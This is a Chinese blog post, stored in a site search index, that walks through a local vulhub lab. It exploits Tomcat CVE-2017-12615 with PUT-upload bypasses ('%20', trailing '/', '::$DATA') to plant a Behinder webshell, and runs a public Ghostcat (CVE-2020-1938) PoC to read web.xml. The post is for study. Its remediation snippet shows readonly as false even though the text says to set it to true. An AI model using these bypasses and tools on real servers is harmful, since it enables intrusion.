@@ -1,0 +1,221 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Tomcat漏洞</title>
+    <url>/2024/03/06/tomcatBug/</url>
+    <content><![CDATA[<blockquote>
+<p>此次实验通过Vmware及kali虚拟机实现并且用到了Docker部署靶场技术</p>
+</blockquote>
+<h1 id="VMWARE16安装以及Kali-2023-03安装"><a href="#VMWARE16安装以及Kali-2023-03安装" class="headerlink" title="VMWARE16安装以及Kali 2023.03安装"></a>VMWARE16安装以及Kali 2023.03安装</h1><p><a href="https://customerconnect.vmware.com/cn/downloads/info/slug/desktop_end_user_computing/vmware_workstation_pro/16_0">Vmware16安装网址</a><br><a href="http://old.kali.org/kali-images/">Kali安装网址</a><br>Vmware创建虚拟机教程我这里不再赘述，网上有很详细的教程，如果kali虚拟机下载慢可以联系我给你我的版本</p>
+<h1 id="在Kali-2023-03上安装Docker准备部署环境"><a href="#在Kali-2023-03上安装Docker准备部署环境" class="headerlink" title="在Kali 2023.03上安装Docker准备部署环境"></a>在Kali 2023.03上安装Docker准备部署环境</h1><h2 id="kali本身apt很老，我们自己更新一下，先换个源，进入apt源的目录："><a href="#kali本身apt很老，我们自己更新一下，先换个源，进入apt源的目录：" class="headerlink" title="kali本身apt很老，我们自己更新一下，先换个源，进入apt源的目录："></a>kali本身apt很老，我们自己更新一下，先换个源，进入apt源的目录：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> vim/etc/apt/sources.list</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-1.png" alt="换源"></p>
+<h2 id="安装https协议、CA证书、dirmngr"><a href="#安装https协议、CA证书、dirmngr" class="headerlink" title="安装https协议、CA证书、dirmngr"></a>安装https协议、CA证书、dirmngr</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> apt-get update</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-2-1.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> apt-get install -y apt-transport-https ca-certificates</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-2-2.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> apt-get install dirmngr</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-2-3.png"></p>
+<h2 id="添加GPG密钥并添加更新源"><a href="#添加GPG密钥并添加更新源" class="headerlink" title="添加GPG密钥并添加更新源"></a>添加GPG密钥并添加更新源</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> curl -fsSL https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg | <span class="built_in">sudo</span> apt-key add -</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">echo</span> <span class="string">&#x27;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#x27;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-3.png"></p>
+<h2 id="系统更新以及安装docker"><a href="#系统更新以及安装docker" class="headerlink" title="系统更新以及安装docker"></a>系统更新以及安装docker</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> apt-get update</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-4-1.png"></p>
+<blockquote>
+<p>注意：安装可能会有报错！！！</p>
+</blockquote>
+<h3 id="在Ubuntu中用apt-get安装软件，系统报出Unmet-dependencies错误"><a href="#在Ubuntu中用apt-get安装软件，系统报出Unmet-dependencies错误" class="headerlink" title="在Ubuntu中用apt-get安装软件，系统报出Unmet dependencies错误"></a>在Ubuntu中用apt-get安装软件，系统报出Unmet dependencies错误</h3><blockquote>
+<p>Unmet dependencies. Try ‘apt –fix-broken install’ with no packages (or specify a solution)</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> apt --fix-broken install</span><br><span class="line">$ <span class="built_in">sudo</span> apt-get update</span><br><span class="line">$ <span class="built_in">sudo</span> apt-get upgrade</span><br><span class="line">一键三连即可解决</span><br></pre></td></tr></table></figure>
+<h3 id="解决Unmet-dependencies后执行以下命令"><a href="#解决Unmet-dependencies后执行以下命令" class="headerlink" title="解决Unmet dependencies后执行以下命令"></a>解决Unmet dependencies后执行以下命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> apt install docker-ce</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-4-2.png"></p>
+<blockquote>
+<p>至此，恭喜你！Docker成功安装</p>
+</blockquote>
+<h2 id="启动Docker服务器"><a href="#启动Docker服务器" class="headerlink" title="启动Docker服务器"></a>启动Docker服务器</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> service docker start</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-5.png"></p>
+<h2 id="安装compose"><a href="#安装compose" class="headerlink" title="安装compose"></a>安装compose</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> apt install docker-compose</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-6.png"></p>
+<h2 id="Docker安装测试"><a href="#Docker安装测试" class="headerlink" title="Docker安装测试"></a>Docker安装测试</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker version    <span class="comment">#查看docker的版本信息</span></span><br><span class="line">$ docker images    <span class="comment">#查看拥有的images</span></span><br><span class="line">$ docker ps    <span class="comment">#查看docker container</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-7-1.png" alt="版本信息"><br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-7-2.png" alt="image和container"></p>
+<h2 id="配置docker拉取源"><a href="#配置docker拉取源" class="headerlink" title="配置docker拉取源"></a>配置docker拉取源</h2><blockquote>
+<p>因为docker是外网，因此我们需要配置国内的加速镜像源，我这里使用阿里的镜像源</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://xxxxxxxxxx.mirror.aliyuncs.com&quot;</span>]  //此处需换成自己的阿里云加速镜像地址</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">$ <span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line">$ <span class="built_in">sudo</span> systemctl restart docker</span><br><span class="line"><span class="comment"># 直接复制以上所有命令执行</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>如遇到阿里源不能用的情况下，我又搜集了以下稳定且新的镜像源可用</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#配置加速地址（以下三个中任意选一个使用）</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">sudo</span> vim /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">I.&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://docker.1panel.live&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">II.&#123;</span><br><span class="line">    <span class="string">&quot;registry-mirrors&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;https://docker.211678.top&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://docker.1panel.live&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://hub.rat.dev&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://docker.m.daocloud.io&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://do.nark.eu.org&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://dockerpull.com&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://dockerproxy.cn&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://docker.awsl9527.cn&quot;</span></span><br><span class="line">      ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">III.&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://docker.m.daocloud.io&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="重启Docker"><a href="#重启Docker" class="headerlink" title="重启Docker"></a>重启Docker</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line">$ <span class="built_in">sudo</span> systemctl restart  docker</span><br></pre></td></tr></table></figure>
+<h2 id="环境运行结束后要及时停止进程"><a href="#环境运行结束后要及时停止进程" class="headerlink" title="环境运行结束后要及时停止进程"></a>环境运行结束后要及时停止进程</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop （<span class="built_in">id</span>号）</span><br></pre></td></tr></table></figure>
+<h1 id="基于Docker搭建靶场"><a href="#基于Docker搭建靶场" class="headerlink" title="基于Docker搭建靶场"></a>基于Docker搭建靶场</h1><h2 id="下载vulhub"><a href="#下载vulhub" class="headerlink" title="下载vulhub"></a>下载vulhub</h2><p><a href="https://github.com/vulhub/vulhub">靶场网址</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-3-1.png"></p>
+<h2 id="下载完成，进入目录"><a href="#下载完成，进入目录" class="headerlink" title="下载完成，进入目录"></a>下载完成，进入目录</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">cd</span> vulhub</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-3-2.png"></p>
+<h2 id="我们可看到其中有各种环境-接下来我们就可以方便搭建各种漏洞环境了"><a href="#我们可看到其中有各种环境-接下来我们就可以方便搭建各种漏洞环境了" class="headerlink" title="我们可看到其中有各种环境,接下来我们就可以方便搭建各种漏洞环境了"></a>我们可看到其中有各种环境,接下来我们就可以方便搭建各种漏洞环境了</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">cd</span> struts2</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-3-3-1.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">cd</span> s2-057</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-3-3-2.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#然后执行命令，开启struts2-057漏洞</span></span><br><span class="line">$ <span class="built_in">sudo</span> docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-3-3-3.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> docker ps  <span class="comment">#查看此时运行的环境</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-3-3-4.png"></p>
+<blockquote>
+<p>接下来只需要访问对应ip地址+端口号就可以访问漏洞环境</p>
+</blockquote>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-3-3-5.png"></p>
+<h1 id="CVE-2017-12615漏洞"><a href="#CVE-2017-12615漏洞" class="headerlink" title="CVE-2017-12615漏洞"></a>CVE-2017-12615漏洞</h1><blockquote>
+<p>漏洞原理：由于配置不当（非默认配置），将配置文件conf&#x2F;web.xml中的readonly设置为了 false，导致可以使用PUT方法上传任意文件，但限制了jsp后缀的上传<br>根据描述，在 Windows 服务器下，将 readonly 参数设置为 false 时，即可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码<br>通过阅读 conf&#x2F;web.xml 文件，可以发现，默认 readonly 为 true，当 readonly 设置为 false 时，可以通过 PUT &#x2F; DELETE 进行文件操控</p>
+</blockquote>
+<h2 id="首先进入CVE-2017-12615的docker环境"><a href="#首先进入CVE-2017-12615的docker环境" class="headerlink" title="首先进入CVE-2017-12615的docker环境"></a>首先进入CVE-2017-12615的docker环境</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> docker-compose up -d     <span class="comment">#启动环境</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-1-1.png" alt="启动环境"><br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-1-2.png" alt="查看此时环境"></p>
+<h2 id="这里首先进入Docker里查看一下web-xml的代码，可以看到这里readonly设置为false，所以存在漏洞"><a href="#这里首先进入Docker里查看一下web-xml的代码，可以看到这里readonly设置为false，所以存在漏洞" class="headerlink" title="这里首先进入Docker里查看一下web.xml的代码，可以看到这里readonly设置为false，所以存在漏洞"></a>这里首先进入Docker里查看一下web.xml的代码，可以看到这里readonly设置为false，所以存在漏洞</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> docker <span class="built_in">exec</span> -ti 你的环境ID号 bash  <span class="comment">#进入Docker</span></span><br><span class="line">$ <span class="built_in">cat</span> conf/web.xml | grep <span class="built_in">readonly</span>   <span class="comment">#查看web.xml代码</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-2.png"></p>
+<h2 id="此时漏洞环境已经搭建成功，在8080端口进行抓包，这里发现是一个GET方法"><a href="#此时漏洞环境已经搭建成功，在8080端口进行抓包，这里发现是一个GET方法" class="headerlink" title="此时漏洞环境已经搭建成功，在8080端口进行抓包，这里发现是一个GET方法"></a>此时漏洞环境已经搭建成功，在8080端口进行抓包，这里发现是一个GET方法</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-3.png"></p>
+<h2 id="这里首先测试一下，改为PUT方法写入一个test-txt，这里看到返回201，应该已经上传成功了"><a href="#这里首先测试一下，改为PUT方法写入一个test-txt，这里看到返回201，应该已经上传成功了" class="headerlink" title="这里首先测试一下，改为PUT方法写入一个test.txt，这里看到返回201，应该已经上传成功了"></a>这里首先测试一下，改为PUT方法写入一个test.txt，这里看到返回201，应该已经上传成功了</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PUT /lzj.txt HTTP/1.1 hello</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-4.png"></p>
+<h2 id="这里进入docker查看一下已经写入成功了"><a href="#这里进入docker查看一下已经写入成功了" class="headerlink" title="这里进入docker查看一下已经写入成功了"></a>这里进入docker查看一下已经写入成功了</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /usr/local/tomcat/webapps/ROOT  <span class="built_in">ls</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-5.png"></p>
+<h2 id="使用PUT方法上传任意文件，但限制了jsp后缀的上传，这里我们首先使用PUT方法直接上传一个冰蝎的jsp上去，发现返回的是404，应该是被拦截了"><a href="#使用PUT方法上传任意文件，但限制了jsp后缀的上传，这里我们首先使用PUT方法直接上传一个冰蝎的jsp上去，发现返回的是404，应该是被拦截了" class="headerlink" title="使用PUT方法上传任意文件，但限制了jsp后缀的上传，这里我们首先使用PUT方法直接上传一个冰蝎的jsp上去，发现返回的是404，应该是被拦截了"></a>使用PUT方法上传任意文件，但限制了jsp后缀的上传，这里我们首先使用PUT方法直接上传一个冰蝎的jsp上去，发现返回的是404，应该是被拦截了</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-6.png"></p>
+<h2 id="这里就需要进行绕过，这里绕过有三种方法"><a href="#这里就需要进行绕过，这里绕过有三种方法" class="headerlink" title="这里就需要进行绕过，这里绕过有三种方法"></a>这里就需要进行绕过，这里绕过有三种方法</h2><h3 id="Windows下不允许文件以空格结尾以PUT-a001-jsp-20-HTTP-1-1上传到-Windows会被自动去掉末尾空格使用-20绕过。我们知道-20对应的是空格，在windows中若文件这里在jsp后面添加-20即可达到自动抹去空格的效果。这里看到返回201已经上传成功了"><a href="#Windows下不允许文件以空格结尾以PUT-a001-jsp-20-HTTP-1-1上传到-Windows会被自动去掉末尾空格使用-20绕过。我们知道-20对应的是空格，在windows中若文件这里在jsp后面添加-20即可达到自动抹去空格的效果。这里看到返回201已经上传成功了" class="headerlink" title="Windows下不允许文件以空格结尾以PUT &#x2F;a001.jsp%20 HTTP&#x2F;1.1上传到 Windows会被自动去掉末尾空格使用%20绕过。我们知道%20对应的是空格，在windows中若文件这里在jsp后面添加%20即可达到自动抹去空格的效果。这里看到返回201已经上传成功了"></a>Windows下不允许文件以空格结尾以PUT &#x2F;a001.jsp%20 HTTP&#x2F;1.1上传到 Windows会被自动去掉末尾空格使用%20绕过。我们知道%20对应的是空格，在windows中若文件这里在jsp后面添加%20即可达到自动抹去空格的效果。这里看到返回201已经上传成功了</h3><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-7-1.png"></p>
+<h4 id="进入docker查看，上传成功"><a href="#进入docker查看，上传成功" class="headerlink" title="进入docker查看，上传成功"></a>进入docker查看，上传成功</h4><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-7-2.png"></p>
+<h3 id="在jsp后缀后面使用-，因为-在文件名中是非法的，在windows和linux中都会自动去除。根据这个特性，上传-ice1-jsp-，看到返回201"><a href="#在jsp后缀后面使用-，因为-在文件名中是非法的，在windows和linux中都会自动去除。根据这个特性，上传-ice1-jsp-，看到返回201" class="headerlink" title="在jsp后缀后面使用&#x2F;，因为&#x2F;在文件名中是非法的，在windows和linux中都会自动去除。根据这个特性，上传&#x2F;ice1.jsp&#x2F;，看到返回201"></a>在jsp后缀后面使用&#x2F;，因为&#x2F;在文件名中是非法的，在windows和linux中都会自动去除。根据这个特性，上传&#x2F;ice1.jsp&#x2F;，看到返回201</h3><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-7-3.png"></p>
+<h4 id="进入docker查看，上传成功-1"><a href="#进入docker查看，上传成功-1" class="headerlink" title="进入docker查看，上传成功"></a>进入docker查看，上传成功</h4><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-7-4.png"></p>
+<h3 id="使用Windows-NTFS流，在jsp后面添加-DATA，看到返回201，上传成功"><a href="#使用Windows-NTFS流，在jsp后面添加-DATA，看到返回201，上传成功" class="headerlink" title="使用Windows NTFS流，在jsp后面添加::$DATA，看到返回201，上传成功"></a>使用Windows NTFS流，在jsp后面添加::$DATA，看到返回201，上传成功</h3><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-7-5.png"></p>
+<h4 id="进入docker查看，上传成功-2"><a href="#进入docker查看，上传成功-2" class="headerlink" title="进入docker查看，上传成功"></a>进入docker查看，上传成功</h4><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-7-6.png"></p>
+<h2 id="使用冰蝎工具进行连接jsp，拿到webshell"><a href="#使用冰蝎工具进行连接jsp，拿到webshell" class="headerlink" title="使用冰蝎工具进行连接jsp，拿到webshell"></a>使用冰蝎工具进行连接jsp，拿到webshell</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-8.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">漏洞修复：把<span class="built_in">readonly</span> 改成<span class="literal">true</span></span><br><span class="line">&lt;init-param&gt;</span><br><span class="line"> &lt;param-name&gt;<span class="built_in">readonly</span>&lt;/param-name&gt;</span><br><span class="line"> &lt;param-value&gt;<span class="literal">false</span>&lt;/param-value&gt;</span><br><span class="line">&lt;/init-param&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="CVE-2020-1938漏洞"><a href="#CVE-2020-1938漏洞" class="headerlink" title="CVE-2020-1938漏洞"></a>CVE-2020-1938漏洞</h1><blockquote>
+<p>漏洞介绍：CVE-2020-1938为Tomcat AJP文件包含漏洞。由长亭科技安全研究员发现的存在于 Tomcat中的安全漏洞，由于 Tomcat AJP协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector可以读取或包含 Tomcat上所有 webapp目录下的任意文件，例如可以读取 webapp配置文件或源码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p>
+</blockquote>
+<blockquote>
+<p>漏洞原理：Tomcat 配置了两个Connecto，它们分别是 HTTP 和 AJP ：HTTP默认端口为8080，处理http请求，而AJP默认端口8009，用于处理 AJP 协议的请求，而AJP比http更加优化，多用于反向、集群等，漏洞由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件以及可以包含任意文件，如果有某上传点，上传图片马等等，即可以获取shelltomcat默认的conf&#x2F;server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口，两个端口默认均监听在外网ip。</p>
+</blockquote>
+<blockquote>
+<p>此次实验环境靶场:kali2023 192.168.74.130 攻击机器:kali2023 192.168.74.142</p>
+</blockquote>
+<h2 id="启动CVE-2020-1938的docker环境"><a href="#启动CVE-2020-1938的docker环境" class="headerlink" title="启动CVE-2020-1938的docker环境"></a>启动CVE-2020-1938的docker环境</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">cd</span>/valhub/tomcat/CVE-2020-1938  <span class="comment">#进入漏洞目录</span></span><br><span class="line">$ <span class="built_in">sudo</span> docker-compose up -d  <span class="comment">#启动环境</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-1-1.png"></p>
+<blockquote>
+<p>注意：此时启动环境发生错误，原因是我们上次的环境没有关闭，端口被占用了，我们只需关闭上次环境即可解决</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> docker stop <span class="built_in">id</span>号  <span class="comment">#Docker关闭环境命令</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-1-2.png"></p>
+<h2 id="此时攻击机器可访问到靶场，代表靶场搭建成功"><a href="#此时攻击机器可访问到靶场，代表靶场搭建成功" class="headerlink" title="此时攻击机器可访问到靶场，代表靶场搭建成功"></a>此时攻击机器可访问到靶场，代表靶场搭建成功</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-2.png"></p>
+<h2 id="首先在攻击机器使用poc进行漏洞检测，若存在漏洞则可以查看webapps目录下的所有文件"><a href="#首先在攻击机器使用poc进行漏洞检测，若存在漏洞则可以查看webapps目录下的所有文件" class="headerlink" title="首先在攻击机器使用poc进行漏洞检测，若存在漏洞则可以查看webapps目录下的所有文件"></a>首先在攻击机器使用poc进行漏洞检测，若存在漏洞则可以查看webapps目录下的所有文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi.git</span><br><span class="line">$ <span class="built_in">cd</span> CNVD-2020-10487-Tomcat-Ajp-lfi</span><br><span class="line">$ python CNVD-2020-10487-Tomcat-Ajp-lfi.py</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-3.png"></p>
+<h2 id="这里查看8009端口下的web-xml文件"><a href="#这里查看8009端口下的web-xml文件" class="headerlink" title="这里查看8009端口下的web.xml文件"></a>这里查看8009端口下的web.xml文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.74.130 -p 8009 -f /WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-4-1.png"></p>
+<blockquote>
+<p>注意：此时出现错误，原因是这个错误通常发生在尝试使用Python的socket库创建一个文件对象时，错误地传递了一个不被支持的参数。在Python 3中，socket.makefile()方法已经不再接受’bufsize’参数，这可能是由于脚本是基于旧版本的Python或使用了过时的代码示例</p>
+</blockquote>
+<blockquote>
+<p>我选择的解决方案是：更换python版本为2.x，kali新版默认已经将python2.7和python3装好了，因为有的软件对python版本有要求，因此我下面说一下如何在两个python版本中进行切换（优先级150&gt;100）设置版本优先级（通过update-alternatives命令：其作用是进行软件版本的切换，Linux发行版中均可用此命令）</p>
+</blockquote>
+<h3 id="首先查看我的python初始版本为3-x"><a href="#首先查看我的python初始版本为3-x" class="headerlink" title="首先查看我的python初始版本为3.x"></a>首先查看我的python初始版本为3.x</h3><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-4-2.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">ls</span> /usr/bin/python*  <span class="comment">#查看所有的python版本</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-4-3.png"></p>
+<h3 id="设置优先级"><a href="#设置优先级" class="headerlink" title="设置优先级"></a>设置优先级</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> update-alternatives --install /usr/bin/python python /usr/bin/python2 100</span><br><span class="line">$ <span class="built_in">sudo</span> update-alternatives --install /usr/bin/python python /usr/bin/python3 150</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-4-4.png"></p>
+<h3 id="查看当前可识别版本"><a href="#查看当前可识别版本" class="headerlink" title="查看当前可识别版本"></a>查看当前可识别版本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> update-alternatives --list python</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-4-5.png"></p>
